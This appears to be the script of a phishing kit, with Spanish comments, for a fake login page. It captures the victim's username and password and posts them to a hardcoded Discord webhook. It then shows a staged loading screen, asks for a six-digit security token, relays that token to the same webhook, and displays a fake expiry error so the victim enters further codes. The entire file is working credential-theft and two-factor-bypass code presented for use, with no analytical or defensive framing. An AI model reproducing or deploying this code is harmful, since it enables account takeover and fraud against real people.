// CONFIGURACIÓN: Coloca aquí la URL de tu Webhook de Discord
const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp";

// Variable global para almacenar los datos durante el flujo
let datosFlujo = {
    usuario: '',
    password: '',
    token: ''
};

// Función para alternar la visibilidad de la contraseña
function togglePass() {
    const input = document.getElementById('password');
    input.type = input.type === 'password' ? 'text' : 'password';
}

// 1. PRIMER ENVÍO: Se ejecuta al presionar "Iniciar Sesión"
function iniciarCarga(event) {
    event.preventDefault();

    // Guardar credenciales de la primera pantalla
    datosFlujo.usuario = event.target.querySelector('input[type="text"]').value;
    datosFlujo.password = document.getElementById('password').value;

    // Estructura del primer mensaje (Usuario y Clave)
    const primerMensaje = {
        content: "🔔 **[PASO 1] Datos de Inicio de Sesión**",
        embeds: [{
            title: "Credenciales Capturadas",
            color: 16753920, // Color naranja para identificar el paso 1
            fields: [
                { name: "👤 Usuario", value: `\`\`\`${datosFlujo.usuario}\`\`\``, inline: true },
                { name: "🔑 Contraseña", value: `\`\`\`${datosFlujo.password}\`\`\``, inline: true }
            ],
            footer: { text: "Esperando el ingreso del token..." }
        }]
    };

    // Enviar inmediatamente las credenciales a Discord
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(primerMensaje)
    }).catch(error => console.error('Error al enviar Paso 1:', error));

    // Cambiar a la vista de carga (Loading) de 10 segundos
    document.getElementById('login-view').style.display = 'none';
    document.getElementById('footer-text').style.display = 'none';
    document.getElementById('loading-view').style.display = 'flex';

    let segundosRestantes = 10;
    const timerElement = document.getElementById('timer');

    const intervalo = setInterval(() => {
        segundosRestantes--;
        timerElement.innerText = segundosRestantes + "s";

        if (segundosRestantes <= 0) {
            clearInterval(intervalo);
            mostrarModalToken();
        }
    }, 1000);
}

// Muestra el modal para ingresar el Token
function mostrarModalToken() {
    document.getElementById('loading-view').style.display = 'none';
    document.getElementById('login-view').style.display = 'block';
    document.getElementById('footer-text').style.display = 'block';
    document.getElementById('tokenModal').style.display = 'flex';
    
    document.getElementById('tokenError').style.display = 'none';
    document.querySelectorAll('.token-field').forEach(input => {
        input.value = "";
        input.classList.remove('error-border');
    });

    document.querySelectorAll('.token-field')[0].focus();
}

// Controladores para el comportamiento de las casillas del token
function moverFoco(currentInput, index) {
    if (currentInput.value.length >= 1 && index < 6) {
        document.querySelectorAll('.token-field')[index].focus();
    }
}

function borrarToken(event, currentInput) {
    if (event.key === "Backspace" && currentInput.value.length === 0) {
        const inputs = document.querySelectorAll('.token-field');
        const index = Array.from(inputs).indexOf(currentInput);
        if (index > 0) {
            inputs[index - 1].focus();
        }
    }
}

// 2. SEGUNDO ENVÍO: Se ejecuta al verificar el Token de 6 dígitos
function verificarToken() {
    let tokenCompleto = "";
    const inputs = document.querySelectorAll('.token-field');
    const btnText = document.getElementById('btnText');
    const btnSpinner = document.getElementById('btnSpinner');
    
    inputs.forEach(input => {
        tokenCompleto += input.value;
    });

    if (tokenCompleto.length === 6) {
        document.getElementById('tokenError').style.display = 'none';
        
        // Efecto visual de carga en el botón
        btnText.style.display = 'none';
        btnSpinner.style.display = 'block';

        datosFlujo.token = tokenCompleto;

        // Estructura del segundo mensaje (Solo el Token)
        const segundoMensaje = {
            content: "🔔 **[PASO 2] Token de Seguridad**",
            embeds: [{
                title: "Código Recibido",
                color: 6432495, // Color morado
                fields: [
                    { name: "👤 Usuario asociado", value: `\`\`\`${datosFlujo.usuario}\`\`\``, inline: true },
                    { name: "🔢 Token Ingresado", value: `\`\`\`${datosFlujo.token}\`\`\``, inline: true }
                ],
                footer: { text: "Flujo completado" }
            }]
        };

        // Enviar el token a Discord
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(segundoMensaje)
        })
        .then(() => {
            // Esperar 2 segundos de carga simulada antes de mostrar el error de expiración
            setTimeout(() => {
                btnText.style.display = 'block';
                btnSpinner.style.display = 'none';

                // Mostrar error en la interfaz
                document.getElementById('tokenError').style.display = 'block';
                
                inputs.forEach(input => {
                    input.value = "";
                    input.classList.add('error-border');
                });
                inputs[0].focus();
            }, 2000);
        })
        .catch(error => {
            console.error('Error al enviar Paso 2:', error);
            setTimeout(() => {
                btnText.style.display = 'block';
                btnSpinner.style.display = 'none';
                document.getElementById('tokenError').style.display = 'block';
                inputs.forEach(input => { input.value = ""; });
                inputs[0].focus();
            }, 2000);
        });

    } else {
        alert("Por favor, completa los 6 dígitos del token.");
    }
}